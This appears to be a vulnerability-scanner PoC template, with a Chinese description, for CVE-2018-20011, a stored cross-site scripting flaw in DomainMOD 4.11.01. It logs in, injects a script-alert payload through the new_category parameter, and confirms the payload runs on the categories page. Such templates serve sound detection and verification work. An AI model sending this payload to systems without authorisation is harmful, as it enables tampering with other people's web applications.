[info]
author = "ave"
description = "通过向 /assets/add/category.php 的 new_category 参数注入 XSS payload，验证 DomainMOD 4.11.01 存储型跨站脚本漏洞。需先登录系统，注入后访问 /assets/categories.php 确认 payload 执行。"
id = "POC-AVE-2018-0161"
name = "DomainMOD 4.11.01 category.php 跨站脚本攻击 PoC"
severity = "medium"
tags = ["ave-2018-0161"]
vuln_id = [
    "CVE-2018-20011",
    "AVE-2018-0161",
]

[poc]
logic = "all"

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/"
protocol = "http"

[poc.requests.body]
content = "new_username={{username}}&new_password={{password}}"
type = "raw"

[poc.requests.headers]
Content-Type = "application/x-www-form-urlencoded"

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/assets/add/category.php"
protocol = "http"

[poc.requests.body]
content = "new_category=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&new_stakeholder=&new_notes="
type = "raw"

[poc.requests.headers]
Content-Type = "application/x-www-form-urlencoded"

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/assets/categories.php"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["><script>alert(document.domain)</script></a>"]
